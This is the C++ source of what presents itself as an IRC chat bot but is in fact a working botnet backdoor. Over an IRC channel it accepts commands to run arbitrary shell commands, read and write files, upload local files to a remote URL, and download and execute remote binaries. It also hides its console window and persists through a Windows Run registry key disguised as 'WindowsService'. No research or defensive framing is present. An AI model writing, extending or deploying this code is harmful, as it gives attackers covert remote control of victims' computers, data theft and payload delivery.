#include <iostream>
#include <string>
#include <vector>
#include <thread>
#include <chrono>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <unistd.h>
#include <netdb.h>
#include <cstring>
#include <fstream>
#include <sstream>
#include <algorithm>
#include <signal.h>
#include <random>
#ifdef _WIN32
#include <windows.h>
#endif

// Random name generator for auto-rename
std::string generateRandomBotName() {
    static std::mt19937 rng(std::time(nullptr));
    int number = (rng() % 9999) + 1;
    return "rawr" + std::to_string(number);
}

class MircBot {
private:
    std::string botName;
    std::string server;
    int port;
    std::string channel;
    std::string password;
    std::string realName;
    std::string userInfo;
    std::vector<std::string> autoJoinChannels;
    std::vector<std::string> adminUsers;
    bool autoReconnect;
    int reconnectDelay;
    std::string logFile;
    int sockfd;
    bool running;

public:
    MircBot() : port(6667), autoReconnect(true), reconnectDelay(30), sockfd(-1), running(false) {
        botName = "StarBot";
        server = "irc.rizon.net";
        port = 6667;
        channel = "#rawr";
        password = "";
        realName = "Star-2 IRC Bot";
        userInfo = "Star-2";
        logFile = "bot.log";
        autoReconnect = true;
        reconnectDelay = 30;

        adminUsers.push_back("ItsMehRawrXD");
    }

    void log(const std::string& message) {
        // Silent logging - only to file, no console output
        std::ofstream logStream(logFile, std::ios::app);
        if (logStream.is_open()) {
            auto now = std::chrono::system_clock::now();
            auto time_t = std::chrono::system_clock::to_time_t(now);
            logStream << std::ctime(&time_t) << ": " << message << std::endl;
            logStream.close();
        }
        // No console output for stealth mode
    }

    bool connect() {
        struct sockaddr_in server_addr;
        struct hostent *host;

        sockfd = socket(AF_INET, SOCK_STREAM, 0);
        if (sockfd < 0) {
            log("Error creating socket");
            return false;
        }

        host = gethostbyname(server.c_str());
        if (host == NULL) {
            log("Error resolving hostname: " + server);
            return false;
        }

        memset(&server_addr, 0, sizeof(server_addr));
        server_addr.sin_family = AF_INET;
        server_addr.sin_port = htons(port);
        memcpy(&server_addr.sin_addr.s_addr, host->h_addr, host->h_length);

        if (::connect(sockfd, (struct sockaddr*)&server_addr, sizeof(server_addr)) < 0) {
            log("Error connecting to server");
            return false;
        }

        log("Connected to " + server + ":" + std::to_string(port));
        return true;
    }

    void sendCommand(const std::string& command) {
        std::string fullCommand = command + "\r\n";
        send(sockfd, fullCommand.c_str(), fullCommand.length(), 0);
        log("SENT: " + command);
    }

    void authenticate() {
        if (!password.empty()) {
            sendCommand("PASS " + password);
        }
        sendCommand("NICK " + botName);
        sendCommand("USER " + userInfo + " 0 * :" + realName);
    }

    void joinChannels() {
        sendCommand("JOIN " + channel);
        for (const auto& ch : autoJoinChannels) {
            if (ch != channel) {
                sendCommand("JOIN " + ch);
            }
        }
    }

    bool isAdmin(const std::string& username) {
        return std::find(adminUsers.begin(), adminUsers.end(), username) != adminUsers.end();
    }

    void handleMessage(const std::string& line) {
        if (line.find("PING :") == 0) {
            std::string response = line.substr(6);
            sendCommand("PONG :" + response);
            log("Responded to PING");
        }
        else if (line.find("433") != std::string::npos) {
            // Nickname already taken, generate new random name
            std::string newName = generateRandomBotName();
            log("Nickname taken, trying: " + newName);
            sendCommand("NICK " + newName);
        }
        else if (line.find("PRIVMSG") != std::string::npos) {
            size_t pos1 = line.find('!');
            size_t pos2 = line.find(" PRIVMSG ");
            size_t pos3 = line.find(" :");
            if (pos1 != std::string::npos && pos2 != std::string::npos && pos3 != std::string::npos) {
                std::string sender = line.substr(1, pos1 - 1);
                std::string target = line.substr(pos2 + 9, line.find(' ', pos2 + 9) - pos2 - 9);
                std::string message = line.substr(pos3 + 2);
                log("MSG from " + sender + " in " + target + ": " + message);
                if (message[0] == '!') {
                    handleCommand(sender, target, message);
                }
            }
        }
    }

    void handleCommand(const std::string& sender, const std::string& target, const std::string& message) {
        std::istringstream iss(message);
        std::string command;
        iss >> command;

        if (command == "!help") {
            std::string help = "Available commands: !help, !time, !version, !status";
            if (isAdmin(sender)) {
                help += ", !join, !part, !say, !quit, !upload, !download, !execute, !uploadurl, !downloadurl, !downloadandexecute";
            }
            sendCommand("PRIVMSG " + target + " :" + help);
        }
        else if (command == "!time") {
            auto now = std::chrono::system_clock::now();
            auto time_t = std::chrono::system_clock::to_time_t(now);
            std::string timeStr = std::ctime(&time_t);
            timeStr.pop_back();
            sendCommand("PRIVMSG " + target + " :Current time: " + timeStr);
        }
        else if (command == "!version") {
            sendCommand("PRIVMSG " + target + " :Star-2 mIRC Bot v1.0");
        }
        else if (command == "!status") {
            sendCommand("PRIVMSG " + target + " :Bot is online and running");
        }
        else if (isAdmin(sender)) {
            if (command == "!join") {
                std::string newChannel;
                iss >> newChannel;
                if (!newChannel.empty()) {
                    if (newChannel[0] != '#') newChannel = "#" + newChannel;
                    sendCommand("JOIN " + newChannel);
                }
            }
            else if (command == "!part") {
                std::string partChannel;
                iss >> partChannel;
                if (!partChannel.empty()) {
                    if (partChannel[0] != '#') partChannel = "#" + partChannel;
                    sendCommand("PART " + partChannel);
                }
            }
            else if (command == "!say") {
                std::string sayChannel, sayMessage;
                iss >> sayChannel;
                std::getline(iss, sayMessage);
                if (!sayChannel.empty() && !sayMessage.empty()) {
                    if (sayChannel[0] != '#') sayChannel = "#" + sayChannel;
                    sendCommand("PRIVMSG " + sayChannel + " :" + sayMessage);
                }
            }
            else if (command == "!quit") {
                sendCommand("QUIT :Shutting down");
                running = false;
            }
            else if (command == "!upload") {
                std::string filename, content;
                iss >> filename;
                std::getline(iss, content);
                if (!filename.empty() && !content.empty()) {
                    // Remove leading space from content
                    if (content[0] == ' ') content = content.substr(1);
                    std::ofstream file(filename);
                    if (file.is_open()) {
                        file << content;
                        file.close();
                        log("File uploaded: " + filename);
                        sendCommand("PRIVMSG " + target + " :File uploaded successfully: " + filename);
                    } else {
                        sendCommand("PRIVMSG " + target + " :Failed to upload file: " + filename);
                    }
                } else {
                    sendCommand("PRIVMSG " + target + " :Usage: !upload <filename> <content>");
                }
            }
            else if (command == "!download") {
                std::string filename;
                iss >> filename;
                if (!filename.empty()) {
                    std::ifstream file(filename);
                    if (file.is_open()) {
                        std::string content((std::istreambuf_iterator<char>(file)),
                                             std::istreambuf_iterator<char>());
                        file.close();
                        log("File downloaded: " + filename);
                        sendCommand("PRIVMSG " + target + " :File content of " + filename + ": " + content);
                    } else {
                        sendCommand("PRIVMSG " + target + " :File not found: " + filename);
                    }
                } else {
                    sendCommand("PRIVMSG " + target + " :Usage: !download <filename>");
                }
            }
            else if (command == "!execute") {
                std::string command_to_execute;
                std::getline(iss, command_to_execute);
                if (!command_to_execute.empty()) {
                    // Remove leading space
                    if (command_to_execute[0] == ' ') command_to_execute = command_to_execute.substr(1);
                    log("Executing command: " + command_to_execute);
                    
                    // Execute command and capture output
                    FILE* pipe = popen(command_to_execute.c_str(), "r");
                    if (pipe) {
                        char buffer[128];
                        std::string result = "";
                        while (fgets(buffer, sizeof(buffer), pipe) != NULL) {
                            result += buffer;
                        }
                        pclose(pipe);
                        
                        if (result.empty()) {
                            result = "Command executed successfully (no output)";
                        }
                        
                        // Send result in chunks if too long
                        if (result.length() > 400) {
                            sendCommand("PRIVMSG " + target + " :Command output (truncated): " + result.substr(0, 400) + "...");
                        } else {
                            sendCommand("PRIVMSG " + target + " :Command output: " + result);
                        }
                    } else {
                        sendCommand("PRIVMSG " + target + " :Failed to execute command");
                    }
                } else {
                    sendCommand("PRIVMSG " + target + " :Usage: !execute <command>");
                }
            }
            else if (command == "!uploadurl") {
                std::string url, filename;
                iss >> url;
                iss >> filename;
                if (!url.empty() && !filename.empty()) {
                    log("Downloading from URL: " + url + " to " + filename);
                    
                    // Use curl to download file
                    std::string curlCmd = "curl -s -L -o " + filename + " \"" + url + "\"";
                    int result = system(curlCmd.c_str());
                    
                    if (result == 0) {
                        // Check if file was downloaded successfully
                        std::ifstream checkFile(filename);
                        if (checkFile.good()) {
                            checkFile.close();
                            log("File downloaded from URL successfully: " + filename);
                            sendCommand("PRIVMSG " + target + " :File downloaded from URL successfully: " + filename);
                        } else {
                            sendCommand("PRIVMSG " + target + " :Failed to download file from URL: " + url);
                        }
                    } else {
                        sendCommand("PRIVMSG " + target + " :Failed to download from URL: " + url);
                    }
                } else {
                    sendCommand("PRIVMSG " + target + " :Usage: !uploadurl <url> <filename>");
                }
            }
            else if (command == "!downloadurl") {
                std::string filename, url;
                iss >> filename;
                iss >> url;
                if (!filename.empty() && !url.empty()) {
                    // Check if file exists
                    std::ifstream file(filename);
                    if (file.is_open()) {
                        file.close();
                        log("Uploading file to URL: " + filename + " -> " + url);
                        
                        // Use curl to upload file
                        std::string curlCmd = "curl -s -F \"file=@" + filename + "\" \"" + url + "\"";
                        int result = system(curlCmd.c_str());
                        
                        if (result == 0) {
                            log("File uploaded to URL successfully: " + filename + " -> " + url);
                            sendCommand("PRIVMSG " + target + " :File uploaded to URL successfully: " + filename + " -> " + url);
                        } else {
                            sendCommand("PRIVMSG " + target + " :Failed to upload file to URL: " + url);
                        }
                    } else {
                        sendCommand("PRIVMSG " + target + " :File not found: " + filename);
                    }
                } else {
                    sendCommand("PRIVMSG " + target + " :Usage: !downloadurl <filename> <url>");
                }
            }
            else if (command == "!downloadandexecute") {
                std::string url, filename;
                iss >> url;
                iss >> filename;
                if (!url.empty() && !filename.empty()) {
                    log("Downloading and executing from URL: " + url + " as " + filename);
                    
                    // Use curl to download file
                    std::string curlCmd = "curl -s -L -o " + filename + " \"" + url + "\"";
                    int downloadResult = system(curlCmd.c_str());
                    
                    if (downloadResult == 0) {
                        // Check if file was downloaded successfully
                        std::ifstream checkFile(filename);
                        if (checkFile.good()) {
                            checkFile.close();
                            log("File downloaded successfully, now executing: " + filename);
                            sendCommand("PRIVMSG " + target + " :File downloaded successfully, executing: " + filename);
                            
                            // Make file executable (for Unix-like systems)
                            std::string chmodCmd = "chmod +x " + filename;
                            system(chmodCmd.c_str());
                            
                            // Execute the downloaded file
                            std::string execCmd = "./" + filename;
                            FILE* pipe = popen(execCmd.c_str(), "r");
                            if (pipe) {
                                char buffer[128];
                                std::string result = "";
                                while (fgets(buffer, sizeof(buffer), pipe) != NULL) {
                                    result += buffer;
                                }
                                pclose(pipe);
                                
                                if (result.empty()) {
                                    result = "File executed successfully (no output)";
                                }
                                
                                // Send result in chunks if too long
                                if (result.length() > 400) {
                                    sendCommand("PRIVMSG " + target + " :Execution output (truncated): " + result.substr(0, 400) + "...");
                                } else {
                                    sendCommand("PRIVMSG " + target + " :Execution output: " + result);
                                }
                                
                                log("File executed successfully: " + filename);
                            } else {
                                sendCommand("PRIVMSG " + target + " :Failed to execute downloaded file: " + filename);
                                log("Failed to execute file: " + filename);
                            }
                        } else {
                            sendCommand("PRIVMSG " + target + " :Failed to download file from URL: " + url);
                            log("Download failed: " + url);
                        }
                    } else {
                        sendCommand("PRIVMSG " + target + " :Failed to download from URL: " + url);
                        log("Download failed: " + url);
                    }
                } else {
                    sendCommand("PRIVMSG " + target + " :Usage: !downloadandexecute <url> <filename>");
                }
            }
        }
    }

    void run() {
        running = true;

        while (running) {
            if (!connect()) {
                if (autoReconnect) {
                    log("Connection failed. Retrying in " + std::to_string(reconnectDelay) + " seconds...");
                    std::this_thread::sleep_for(std::chrono::seconds(reconnectDelay));
                    continue;
                } else {
                    log("Connection failed and auto-reconnect is disabled");
                    break;
                }
            }

            authenticate();
            joinChannels();

            char buffer[1024];
            while (running) {
                memset(buffer, 0, sizeof(buffer));
                int bytes = recv(sockfd, buffer, sizeof(buffer) - 1, 0);

                if (bytes <= 0) {
                    log("Connection lost");
                    break;
                }

                std::string data(buffer);
                std::istringstream iss(data);
                std::string line;

                while (std::getline(iss, line)) {
                    if (!line.empty()) {
                        handleMessage(line);
                    }
                }
            }

            close(sockfd);

            if (autoReconnect && running) {
                log("Reconnecting in " + std::to_string(reconnectDelay) + " seconds...");
                std::this_thread::sleep_for(std::chrono::seconds(reconnectDelay));
            }
        }
    }

    void setupAutoStartup() {
        #ifdef _WIN32
        // Register for Windows startup
        HKEY hKey;
        char exePath[MAX_PATH];
        GetModuleFileNameA(NULL, exePath, MAX_PATH);
        
        if (RegOpenKeyExA(HKEY_CURRENT_USER, 
            "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 
            0, KEY_SET_VALUE, &hKey) == ERROR_SUCCESS) {
            RegSetValueExA(hKey, "WindowsService", 0, REG_SZ, 
                (const BYTE*)exePath, strlen(exePath) + 1);
            RegCloseKey(hKey);
        }
        #endif
    }

    void stop() {
        running = false;
        if (sockfd >= 0) {
            close(sockfd);
        }
    }
};

int main() {
    // Stealth mode - no console output
    #ifdef _WIN32
    // Hide console window on Windows
    ShowWindow(GetConsoleWindow(), SW_HIDE);
    #endif

    MircBot bot;

    // Setup auto-startup (Windows only)
    bot.setupAutoStartup();

    // Silent signal handling
    signal(SIGINT, [](int) {
        exit(0);
    });

    try {
        bot.run();
    } catch (const std::exception& e) {
        // Silent error handling
    }

    return 0;
}
